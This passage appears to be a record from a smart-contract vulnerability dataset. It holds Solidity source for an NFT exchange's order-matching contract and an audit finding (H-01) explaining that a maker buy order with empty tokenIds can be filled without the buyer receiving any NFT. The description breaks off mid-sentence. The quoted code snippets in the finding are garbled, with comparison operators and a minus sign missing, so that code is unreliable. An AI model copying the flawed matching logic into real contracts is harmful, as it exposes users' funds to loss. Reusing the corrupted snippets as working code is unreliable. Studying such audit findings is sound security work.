currenciesMatch = sell.execParams[1] == buy.execParams[1] ||\n      (sell.execParams[1] == address(0) && buy.execParams[1] == WETH);\n    return (sell.isSellOrder &&\n      !buy.isSellOrder &&\n      sell.execParams[0] == buy.execParams[0] &&\n      currenciesMatch &&\n      isOrderValid(sell, sellOrderHash) &&\n      isOrderValid(buy, buyOrderHash));\n  }\n\n  /**\n   * @notice Verifies the validity of the order\n   * @dev checks whether order nonce was cancelled or already executed, \n          if signature is valid and if the complication and currency are valid\n   * @param order the order\n   * @param orderHash computed hash of the order\n   */\n  function isOrderValid(OrderTypes.MakerOrder calldata order, bytes32 orderHash) public view returns (bool) {\n    bool orderExpired = isUserOrderNonceExecutedOrCancelled[order.signer][order.constraints[5]] ||\n      order.constraints[5] < userMinOrderNonce[order.signer];\n    // Verify the validity of the signature\n    (bytes32 r, bytes32 s, uint8 v) = abi.decode(order.sig, (bytes32, bytes32, uint8));\n    bool sigValid = SignatureChecker.verify(orderHash, order.signer, r, s, v, DOMAIN_SEPARATOR);\n    if (\n      orderExpired ||\n      !sigValid ||\n      order.signer == address(0) ||\n      !_complications.contains(order.execParams[0]) ||\n      !_currencies.contains(order.execParams[1])\n    ) {\n      return false;\n    }\n    return true;\n  }\n\n  /// @notice returns the number of complications supported by the exchange\n  function numComplications() external view returns (uint256) {\n    return _complications.length();\n  }\n\n  /// @notice returns the complication at the given index\n  function getComplicationAt(uint256 index) external view returns (address) {\n    return _complications.at(index);\n  }\n\n  /// @notice returns whether a given complication is valid\n  function isValidComplication(address complication) external view returns (bool) {\n    return _complications.contains(complication);\n  }\n\n  /// @notice returns the number of currencies supported by the exchange\n  function numCurrencies() external view returns (uint256) {\n    return _currencies.length();\n  }\n\n  /// @notice returns the currency at the given index\n  function getCurrencyAt(uint256 index) external view returns (address) {\n    return _currencies.at(index);\n  }\n\n  /// @notice returns whether a given currency is valid\n  function isValidCurrency(address currency) external view returns (bool) {\n    return _currencies.contains(currency);\n  }\n\n  // ====================================================== INTERNAL FUNCTIONS ================================================\n\n  /**\n   * @notice Internal helper function to match orders one to one\n   * @param makerOrder1 first order\n   * @param makerOrder2 second maker order\n   * @param startGasPerOrder start gas when this order started execution\n   * @param execPrice execution price\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth WETH address\n   */\n  function _matchOneToOneOrders(\n    OrderTypes.MakerOrder calldata makerOrder1,\n    OrderTypes.MakerOrder calldata makerOrder2,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    OrderTypes.MakerOrder calldata sell = makerOrder1.isSellOrder ? makerOrder1 : makerOrder2;\n    OrderTypes.MakerOrder calldata buy = makerOrder1.isSellOrder ? makerOrder2 : makerOrder1;\n    bytes32 sellOrderHash = _hash(sell);\n    bytes32 buyOrderHash = _hash(buy);\n    require(verifyMatchOneToOneOrders(sellOrderHash, buyOrderHash, sell, buy), 'order not verified');\n    _execMatchOneToOneOrders(\n      sellOrderHash,\n      buyOrderHash,\n      sell,\n      buy,\n      startGasPerOrder,\n      execPrice,\n      protocolFeeBps,\n      wethTransferGasUnits,\n      weth\n    );\n  }\n\n  /**\n   * @notice Internal helper function to match one maker sell order to many maker buys\n   * @param sellOrderHash sell order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param startGasPerOrder start gas when this order started execution\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth WETH address\n   */\n  function _matchOneMakerSellToManyMakerBuys(\n    bytes32 sellOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint256 startGasPerOrder,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    bytes32 buyOrderHash = _hash(buy);\n    require(verifyMatchOneToManyOrders(buyOrderHash, false, sell, buy), 'order not verified');\n    _execMatchOneMakerSellToManyMakerBuys(\n      sellOrderHash,\n      buyOrderHash,\n      sell,\n      buy,\n      startGasPerOrder,\n      _getCurrentPrice(buy),\n      protocolFeeBps,\n      wethTransferGasUnits,\n      weth\n    );\n  }\n\n  /**\n   * @notice Internal helper function to match one maker buy order to many maker sells\n   * @param buyOrderHash buy order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param protocolFeeBps exchange fee\n   */\n  function _matchOneMakerBuyToManyMakerSells(\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint16 protocolFeeBps\n  ) internal returns (uint256) {\n    bytes32 sellOrderHash = _hash(sell);\n    require(verifyMatchOneToManyOrders(sellOrderHash, true, sell, buy), 'order not verified');\n    return\n      _execMatchOneMakerBuyToManyMakerSells(\n        sellOrderHash,\n        buyOrderHash,\n        sell,\n        buy,\n        _getCurrentPrice(sell),\n        protocolFeeBps\n      );\n  }\n\n  /**\n   * @notice Internal helper function to match orders specified via a higher order intent\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param constructedNfts the nfts constructed by an off chain matching that are guaranteed to intersect\n            with the user specified signed intents (orders)\n   * @param startGasPerOrder start gas when this order started execution\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth WETH address\n   */\n  function _matchOrders(\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    OrderTypes.OrderItem[] calldata constructedNfts,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    bytes32 sellOrderHash = _hash(sell);\n    bytes32 buyOrderHash = _hash(buy);\n    require(verifyMatchOrders(sellOrderHash, buyOrderHash, sell, buy), 'order not verified');\n    _execMatchOrders(\n      sellOrderHash,\n      buyOrderHash,\n      sell,\n      buy,\n      constructedNfts,\n      startGasPerOrder,\n      execPrice,\n      protocolFeeBps,\n      wethTransferGasUnits,\n      weth\n    );\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers for match one to one orders\n   * @dev Updates order nonce states, does asset transfers and emits events. Also refunds gas expenditure to the contract\n   * @param sellOrderHash sell order hash\n   * @param buyOrderHash buy order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param startGasPerOrder start gas when this order started execution\n   * @param execPrice execution price\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth WETH address\n   */\n  function _execMatchOneToOneOrders(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    isUserOrderNonceExecutedOrCancelled[sell.signer][sell.constraints[5]] = true;\n    isUserOrderNonceExecutedOrCancelled[buy.signer][buy.constraints[5]] = true;\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice - protocolFee;\n    _transferMultipleNFTs(sell.signer, buy.signer, sell.nfts);\n    // transfer final amount (post-fees) to seller\n    IERC20(buy.execParams[1]).safeTransferFrom(buy.signer, sell.signer, remainingAmount);\n    _emitMatchEvent(\n      sellOrderHash,\n      buyOrderHash,\n      sell.signer,\n      buy.signer,\n      buy.execParams[0],\n      buy.execParams[1],\n      execPrice\n    );\n    uint256 gasCost = (startGasPerOrder - gasleft() + wethTransferGasUnits) * tx.gasprice;\n    // if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas\n    // else we need to send the protocol fee separately in the execution currency\n    if (buy.execParams[1] == weth) {\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), protocolFee + gasCost);\n    } else {\n      IERC20(buy.execParams[1]).safeTransferFrom(buy.signer, address(this), protocolFee);\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), gasCost);\n    }\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers for match one sell to many buy orders\n   * @dev Updates order nonce states, does asset transfers and emits events. Also refunds gas expenditure to the contract\n   * @param sellOrderHash sell order hash\n   * @param buyOrderHash buy order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param startGasPerOrder start gas when this order started execution\n   * @param execPrice execution price\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth WETH address\n   */\n  function _execMatchOneMakerSellToManyMakerBuys(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    isUserOrderNonceExecutedOrCancelled[buy.signer][buy.constraints[5]] = true;\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice - protocolFee;\n    _execMatchOneToManyOrders(sell.signer, buy.signer, buy.nfts, buy.execParams[1], remainingAmount);\n    _emitMatchEvent(\n      sellOrderHash,\n      buyOrderHash,\n      sell.signer,\n      buy.signer,\n      buy.execParams[0],\n      buy.execParams[1],\n      execPrice\n    );\n    uint256 gasCost = (startGasPerOrder - gasleft() + wethTransferGasUnits) * tx.gasprice;\n    // if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas\n    // else we need to send the protocol fee separately in the execution currency\n    if (buy.execParams[1] == weth) {\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), protocolFee + gasCost);\n    } else {\n      IERC20(buy.execParams[1]).safeTransferFrom(buy.signer, address(this), protocolFee);\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), gasCost);\n    }\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers for match one buy to many sell orders\n   * @dev Updates order nonce states, does asset transfers and emits events. Gas expenditure refund is done in the caller\n          since it does not need to be done in a loop\n   * @param sellOrderHash sell order hash\n   * @param buyOrderHash buy order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param execPrice execution price\n   * @param protocolFeeBps exchange fee\n   * @return the protocolFee so that the buyer can pay the protocol fee and gas cost in one go\n   */\n  function _execMatchOneMakerBuyToManyMakerSells(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint256 execPrice,\n    uint16 protocolFeeBps\n  ) internal returns (uint256) {\n    isUserOrderNonceExecutedOrCancelled[sell.signer][sell.constraints[5]] = true;\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice - protocolFee;\n    _execMatchOneToManyOrders(sell.signer, buy.signer, sell.nfts, buy.execParams[1], remainingAmount);\n    _emitMatchEvent(\n      sellOrderHash,\n      buyOrderHash,\n      sell.signer,\n      buy.signer,\n      buy.execParams[0],\n      buy.execParams[1],\n      execPrice\n    );\n    return protocolFee;\n  }\n\n  /// @dev this helper purely exists to help reduce contract size a bit and avoid any stack too deep errors\n  function _execMatchOneToManyOrders(\n    address seller,\n    address buyer,\n    OrderTypes.OrderItem[] calldata constructedNfts,\n    address currency,\n    uint256 amount\n  ) internal {\n    _transferMultipleNFTs(seller, buyer, constructedNfts);\n    // transfer final amount (post-fees) to seller\n    IERC20(currency).safeTransferFrom(buyer, seller, amount);\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers for match orders\n   * @dev Updates order nonce states, does asset transfers, emits events and does gas refunds\n   * @param sellOrderHash sell order hash\n   * @param buyOrderHash buy order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param constructedNfts the constructed nfts\n   * @param startGasPerOrder gas when this order started execution\n   * @param execPrice execution price\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth weth address\n   */\n  function _execMatchOrders(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    OrderTypes.OrderItem[] calldata constructedNfts,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice - protocolFee;\n    _execMatchOrder(\n      sell.signer,\n      buy.signer,\n      sell.constraints[5],\n      buy.constraints[5],\n      constructedNfts,\n      buy.execParams[1],\n      remainingAmount\n    );\n    _emitMatchEvent(\n      sellOrderHash,\n      buyOrderHash,\n      sell.signer,\n      buy.signer,\n      buy.execParams[0],\n      buy.execParams[1],\n      execPrice\n    );\n    uint256 gasCost = (startGasPerOrder - gasleft() + wethTransferGasUnits) * tx.gasprice;\n    // if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas\n    // else we need to send the protocol fee separately in the execution currency\n    if (buy.execParams[1] == weth) {\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), protocolFee + gasCost);\n    } else {\n      IERC20(buy.execParams[1]).safeTransferFrom(buy.signer, address(this), protocolFee);\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), gasCost);\n    }\n  }\n\n  /// @dev this helper purely exists to help reduce contract size a bit and avoid any stack too deep errors\n  function _execMatchOrder(\n    address seller,\n    address buyer,\n    uint256 sellNonce,\n    uint256 buyNonce,\n    OrderTypes.OrderItem[] calldata constructedNfts,\n    address currency,\n    uint256 amount\n  ) internal {\n    // Update order execution status to true (prevents replay)\n    isUserOrderNonceExecutedOrCancelled[seller][sellNonce] = true;\n    isUserOrderNonceExecutedOrCancelled[buyer][buyNonce] = true;\n    _transferMultipleNFTs(seller, buyer, constructedNfts);\n    // transfer final amount (post-fees) to seller\n    IERC20(currency).safeTransferFrom(buyer, seller, amount);\n  }\n\n  function _emitMatchEvent(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    address seller,\n    address buyer,\n    address complication,\n    address currency,\n    uint256 amount\n  ) internal {\n    emit MatchOrderFulfilled(sellOrderHash, buyOrderHash, seller, buyer, complication, currency, amount);\n  }\n\n  /**\n   * @notice Internal helper function to take orders\n   * @dev verifies whether order can be executed\n   * @param makerOrder the maker order\n   * @param takerItems nfts to be transferred\n   * @param execPrice execution price\n   */\n  function _takeOrders(\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.OrderItem[] calldata takerItems,\n    uint256 execPrice\n  ) internal {\n    bytes32 makerOrderHash = _hash(makerOrder);\n    bool makerOrderValid = isOrderValid(makerOrder, makerOrderHash);\n    bool executionValid = IComplication(makerOrder.execParams[0]).canExecTakeOrder(makerOrder, takerItems);\n    require(makerOrderValid && executionValid, 'order not verified');\n    _execTakeOrders(makerOrderHash, makerOrder, takerItems, makerOrder.isSellOrder, execPrice);\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers \n              for take orders specifying a higher order intent\n   * @dev Updates order nonce state, does asset transfers and emits events\n   * @param makerOrderHash maker order hash\n   * @param makerOrder the maker order\n   * @param takerItems nfts to be transferred\n   * @param isMakerSeller is the maker order a sell order\n   * @param execPrice execution price\n   */\n  function _execTakeOrders(\n    bytes32 makerOrderHash,\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.OrderItem[] calldata takerItems,\n    bool isMakerSeller,\n    uint256 execPrice\n  ) internal {\n    isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n    if (isMakerSeller) {\n      _transferNFTsAndFees(makerOrder.signer, msg.sender, takerItems, execPrice, makerOrder.execParams[1]);\n      _emitTakerEvent(makerOrderHash, makerOrder.signer, msg.sender, makerOrder, execPrice);\n    } else {\n      _transferNFTsAndFees(msg.sender, makerOrder.signer, takerItems, execPrice, makerOrder.execParams[1]);\n      _emitTakerEvent(makerOrderHash, msg.sender, makerOrder.signer, makerOrder, execPrice);\n    }\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers \n              for simple take orders\n   * @dev Updates order nonce state, does asset transfers and emits events\n   * @param makerOrderHash maker order hash\n   * @param makerOrder the maker order\n   * @param isMakerSeller is the maker order a sell order\n   * @param execPrice execution price\n   */\n  function _execTakeOneOrder(\n    bytes32 makerOrderHash,\n    OrderTypes.MakerOrder calldata makerOrder,\n    bool isMakerSeller,\n    uint256 execPrice\n  ) internal {\n    isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n    if (isMakerSeller) {\n      _transferNFTsAndFees(makerOrder.signer, msg.sender, makerOrder.nfts, execPrice, makerOrder.execParams[1]);\n      _emitTakerEvent(makerOrderHash, makerOrder.signer, msg.sender, makerOrder, execPrice);\n    } else {\n      _transferNFTsAndFees(msg.sender, makerOrder.signer, makerOrder.nfts, execPrice, makerOrder.execParams[1]);\n      _emitTakerEvent(makerOrderHash, msg.sender, makerOrder.signer, makerOrder, execPrice);\n    }\n  }\n\n  function _emitTakerEvent(\n    bytes32 orderHash,\n    address seller,\n    address buyer,\n    OrderTypes.MakerOrder calldata order,\n    uint256 amount\n  ) internal {\n    emit TakeOrderFulfilled(orderHash, seller, buyer, order.execParams[0], order.execParams[1], amount);\n  }\n\n  /**\n   * @notice Transfers NFTs and fees\n   * @param seller the seller\n   * @param buyer the buyer\n   * @param nfts nfts to transfer\n   * @param amount amount to transfer\n   * @param currency currency of the transfer\n   */\n  function _transferNFTsAndFees(\n    address seller,\n    address buyer,\n    OrderTypes.OrderItem[] calldata nfts,\n    uint256 amount,\n    address currency\n  ) internal {\n    // transfer NFTs\n    _transferMultipleNFTs(seller, buyer, nfts);\n    // transfer fees\n    _transferFees(seller, buyer, amount, currency);\n  }\n\n  /**\n   * @notice Transfers multiple NFTs in a loop and ERC1155s in a batch\n   * @param from the from address\n   * @param to the to address\n   * @param nfts nfts to transfer\n   */\n  function _transferMultipleNFTs(\n    address from,\n    address to,\n    OrderTypes.OrderItem[] calldata nfts\n  ) internal {\n    uint256 numNfts = nfts.length;\n    for (uint256 i = 0; i < numNfts; ) {\n      _transferNFTs(from, to, nfts[i]);\n      unchecked {\n        ++i;\n      }\n    }\n  }\n\n  /**\n   * @notice Transfer NFTs\n   * @param from address of the sender\n   * @param to address of the recipient\n   * @param item item to transfer\n   */\n  function _transferNFTs(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    if (IERC165(item.collection).supportsInterface(0x80ac58cd)) {\n      _transferERC721s(from, to, item);\n    } else if (IERC165(item.collection).supportsInterface(0xd9b67a26)) {\n      _transferERC1155s(from, to, item);\n    }\n  }\n\n  /**\n   * @notice Transfer ERC721s\n   * @param from address of the sender\n   * @param to address of the recipient\n   * @param item item to transfer\n   */\n  function _transferERC721s(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    uint256 numTokens = item.tokens.length;\n    for (uint256 i = 0; i < numTokens; ) {\n      IERC721(item.collection).safeTransferFrom(from, to, item.tokens[i].tokenId);\n      unchecked {\n        ++i;\n      }\n    }\n  }\n\n  /**\n   * @notice Transfer ERC1155s\n   * @dev uses the ERC1155 batchTransfer function for efficient transfers\n   * @param from address of the sender\n   * @param to address of the recipient\n   * @param item item to transfer\n   */\n  function _transferERC1155s(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    uint256 numNfts = item.tokens.length;\n    uint256[] memory tokenIdsArr = new uint256[](numNfts);\n    uint256[] memory numTokensPerTokenIdArr = new uint256[](numNfts);\n    for (uint256 i = 0; i < numNfts; ) {\n      tokenIdsArr[i] = item.tokens[i].tokenId;\n      numTokensPerTokenIdArr[i] = item.tokens[i].numTokens;\n      unchecked {\n        ++i;\n      }\n    }\n    IERC1155(item.collection).safeBatchTransferFrom(from, to, tokenIdsArr, numTokensPerTokenIdArr, '0x0');\n  }\n\n  /**\n   * @notice Transfer fees. Fees are always transferred from buyer to the seller and the exchange although seller is \n            the one that actually 'pays' the fees\n   * @dev if the currency ETH, no additional transfer is needed to pay exchange fees since the contract is 'payable'\n   * @param seller the seller\n   * @param buyer the buyer\n   * @param amount amount to transfer\n   * @param currency currency of the transfer\n   */\n  function _transferFees(\n    address seller,\n    address buyer,\n    uint256 amount,\n    address currency\n  ) internal {\n    // protocol fee\n    uint256 protocolFee = (PROTOCOL_FEE_BPS * amount) / 10000;\n    uint256 remainingAmount = amount - protocolFee;\n    // ETH\n    if (currency == address(0)) {\n      // transfer amount to seller\n      (bool sent, ) = seller.call{value: remainingAmount}('');\n      require(sent, 'failed to send ether to seller');\n    } else {\n      // transfer final amount (post-fees) to seller\n      IERC20(currency).safeTransferFrom(buyer, seller, remainingAmount);\n      // send fee to protocol\n      IERC20(currency).safeTransferFrom(buyer, address(this), protocolFee);\n    }\n  }\n\n  // =================================================== UTILS ==================================================================\n\n  /// @dev Gets current order price for orders that vary in price over time (dutch and reverse dutch auctions)\n  function _getCurrentPrice(OrderTypes.MakerOrder calldata order) internal view returns (uint256) {\n    (uint256 startPrice, uint256 endPrice) = (order.constraints[1], order.constraints[2]);\n    uint256 duration = order.constraints[4] - order.constraints[3];\n    uint256 priceDiff = startPrice > endPrice ? startPrice - endPrice : endPrice - startPrice;\n    if (priceDiff == 0 || duration == 0) {\n      return startPrice;\n    }\n    uint256 elapsedTime = block.timestamp - order.constraints[3];\n    uint256 PRECISION = 10**4; // precision for division; similar to bps\n    uint256 portionBps = elapsedTime > duration ? PRECISION : ((elapsedTime * PRECISION) / duration);\n    priceDiff = (priceDiff * portionBps) / PRECISION;\n    return startPrice > endPrice ? startPrice - priceDiff : startPrice + priceDiff;\n  }\n\n  /// @dev hashes the given order with the help of _nftsHash and _tokensHash\n  function _hash(OrderTypes.MakerOrder calldata order) internal pure returns (bytes32) {\n    // keccak256('Order(bool isSellOrder,address signer,uint256[] constraints,OrderItem[] nfts,address[] execParams,bytes extraParams)OrderItem(address collection,TokenInfo[] tokens)TokenInfo(uint256 tokenId,uint256 numTokens)')\n    bytes32 ORDER_HASH = 0x7bcfb5a29031e6b8d34ca1a14dd0a1f5cb11b20f755bb2a31ee3c4b143477e4a;\n    return\n      keccak256(\n        abi.encode(\n          ORDER_HASH,\n          order.isSellOrder,\n          order.signer,\n          keccak256(abi.encodePacked(order.constraints)),\n          _nftsHash(order.nfts),\n          keccak256(abi.encodePacked(order.execParams)),\n          keccak256(order.extraParams)\n        )\n      );\n  }\n\n  function _nftsHash(OrderTypes.OrderItem[] calldata nfts) internal pure returns (bytes32) {\n    // keccak256('OrderItem(address collection,TokenInfo[] tokens)TokenInfo(uint256 tokenId,uint256 numTokens)')\n    bytes32 ORDER_ITEM_HASH = 0xf73f37e9f570369ceaab59cef16249ae1c0ad1afd592d656afac0be6f63b87e0;\n    uint256 numNfts = nfts.length;\n    bytes32[] memory hashes = new bytes32[](numNfts);\n    for (uint256 i = 0; i < numNfts; ) {\n      bytes32 hash = keccak256(abi.encode(ORDER_ITEM_HASH, nfts[i].collection, _tokensHash(nfts[i].tokens)));\n      hashes[i] = hash;\n      unchecked {\n        ++i;\n      }\n    }\n    bytes32 nftsHash = keccak256(abi.encodePacked(hashes));\n    return nftsHash;\n  }\n\n  function _tokensHash(OrderTypes.TokenInfo[] calldata tokens) internal pure returns (bytes32) {\n    // keccak256('TokenInfo(uint256 tokenId,uint256 numTokens)')\n    bytes32 TOKEN_INFO_HASH = 0x88f0bd19d14f8b5d22c0605a15d9fffc285ebc8c86fb21139456d305982906f1;\n    uint256 numTokens = tokens.length;\n    bytes32[] memory hashes = new bytes32[](numTokens);\n    for (uint256 i = 0; i < numTokens; ) {\n      bytes32 hash = keccak256(abi.encode(TOKEN_INFO_HASH, tokens[i].tokenId, tokens[i].numTokens));\n      hashes[i] = hash;\n      unchecked {\n        ++i;\n      }\n    }\n    bytes32 tokensHash = keccak256(abi.encodePacked(hashes));\n    return tokensHash;\n  }\n\n  // ====================================================== ADMIN FUNCTIONS ======================================================\n\n  /// @dev used for rescuing exchange fees paid to the contract in tokens\n  function rescueTokens(\n    address destination,\n    address currency,\n    uint256 amount\n  ) external onlyOwner {\n    IERC20(currency).safeTransfer(destination, amount);\n  }\n\n  /// @dev used for rescuing exchange fees paid to the contract in ETH\n  function rescueETH(address destination) external payable onlyOwner {\n    (bool sent, ) = destination.call{value: msg.value}('');\n    require(sent, 'failed');\n  }\n\n  /// @dev adds a new transaction currency to the exchange\n  function addCurrency(address _currency) external onlyOwner {\n    _currencies.add(_currency);\n  }\n\n  /// @dev adds a new complication to the exchange\n  function addComplication(address _complication) external onlyOwner {\n    _complications.add(_complication);\n  }\n\n  /// @dev removes a transaction currency from the exchange\n  function removeCurrency(address _currency) external onlyOwner {\n    _currencies.remove(_currency);\n  }\n\n  /// @dev removes a complication from the exchange\n  function removeComplication(address _complication) external onlyOwner {\n    _complications.remove(_complication);\n  }\n\n  /// @dev updates auto snipe executor\n  function updateMatchExecutor(address _matchExecutor) external onlyOwner {\n    MATCH_EXECUTOR = _matchExecutor;\n  }\n\n  /// @dev updates the gas units required for WETH transfers\n  function updateWethTranferGas(uint32 _wethTransferGasUnits) external onlyOwner {\n    WETH_TRANSFER_GAS_UNITS = _wethTransferGasUnits;\n    emit NewWethTransferGasUnits(_wethTransferGasUnits);\n  }\n\n  /// @dev updates exchange fees\n  function setProtocolFee(uint16 _protocolFeeBps) external onlyOwner {\n    PROTOCOL_FEE_BPS = _protocolFeeBps;\n    emit NewProtocolFee(_protocolFeeBps);\n  }\n}\n\n\n",
        "CodeNames": [
            "InfinityOrderBookComplication.sol",
            "InfinityExchange.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-01",
                "Location": [
                    "//solidity\nfunction canExecMatchOneToMany(\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.MakerOrder[] calldata manyMakerOrders\n  ) external view override returns (bool) {\n    uint256 numItems;\n    bool isOrdersTimeValid = true;\n    bool itemsIntersect = true;\n    uint256 ordersLength = manyMakerOrders.length;\n    for (uint256 i = 0; i < ordersLength; ) {\n      if (!isOrdersTimeValid || !itemsIntersect) {\n        return false; // short circuit\n      }\n\n      uint256 nftsLength = manyMakerOrders[i].nfts.length;\n      for (uint256 j = 0; j < nftsLength; ) {\n        numItems += manyMakerOrders[i].nfts[j].tokens.length;\n        unchecked {\n          ++j;\n        }\n      }\n\n      isOrdersTimeValid =\n        isOrdersTimeValid &&\n        manyMakerOrders[i].constraints[3] <= block.timestamp &&\n        manyMakerOrders[i].constraints[4] = block.timestamp;\n\n      itemsIntersect = itemsIntersect && doItemsIntersect(makerOrder.nfts, manyMakerOrders[i].nfts);\n\n      unchecked {\n        ++i;\n      }\n    }\n\n    bool _isTimeValid = isOrdersTimeValid &&\n      makerOrder.constraints[3] <= block.timestamp &&\n      makerOrder.constraints[4] = block.timestamp;\n\n    uint256 currentMakerOrderPrice = _getCurrentPrice(makerOrder);\n    uint256 sumCurrentOrderPrices = _sumCurrentPrices(manyMakerOrders);\n\n    bool _isPriceValid = false;\n    if (makerOrder.isSellOrder) {\n      _isPriceValid = sumCurrentOrderPrices = currentMakerOrderPrice;\n    } else {\n      _isPriceValid = sumCurrentOrderPrices <= currentMakerOrderPrice;\n    }\n\n    return (numItems == makerOrder.constraints[0]) && _isTimeValid && itemsIntersect && _isPriceValid;\n  }\n",
                    "//solidity\nfunction _execMatchOneMakerSellToManyMakerBuys(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    isUserOrderNonceExecutedOrCancelled[buy.signer][buy.constraints[5]] = true;\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice protocolFee;\n    _execMatchOneToManyOrders(sell.signer, buy.signer, buy.nfts, buy.execParams[1], remainingAmount);\n    _emitMatchEvent(\n      sellOrderHash,\n      buyOrderHash,\n      sell.signer,\n      buy.signer,\n      buy.execParams[0],\n      buy.execParams[1],\n      execPrice\n    );\n",
                    "//solidity\nfunction _transferERC721s(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    uint256 numTokens = item.tokens.length;\n    for (uint256 i = 0; i < numTokens; ) {\n      IERC721(item.collection).safeTransferFrom(from, to, item.tokens[i].tokenId);\n      unchecked {\n        ++i;\n      }\n    }\n  }\n"
                ],
                "Type": " Maker buy order with no specified NFT tokenIds may get fulfilled in  matchOneToManyOrders  without receiving any NFT",
                "Description": "\nThe call stack: matchOneToManyOrders() - _matchOneMakerSellToManyMakerBuys() - _execMatchOneMakerSellToManyMakerBuys() - _execMatchOneToManyOrders() - _transferMultipleNFTs()\n\nBased on the context, a maker buy order can set OrderItem.tokens as an empty array to indicate that they can accept any tokenId in this collection, in that case, InfinityOrderBookComplication.doTokenIdsIntersect() will always return true.\n\nHowever, when the system matching a sell order with many buy orders, the InfinityOrderBookComplication contract only ensures that the specified tokenIds intersect with the sell order, and the total count of specified tokenIds equals the sell order's quantity (makerOrder.constraints[0]).\n\nThis allows any maker buy order with same collection and empty tokenIds to be added to manyMakerOrders as long as there is another maker buy order with specified tokenIds that matched the sell order's 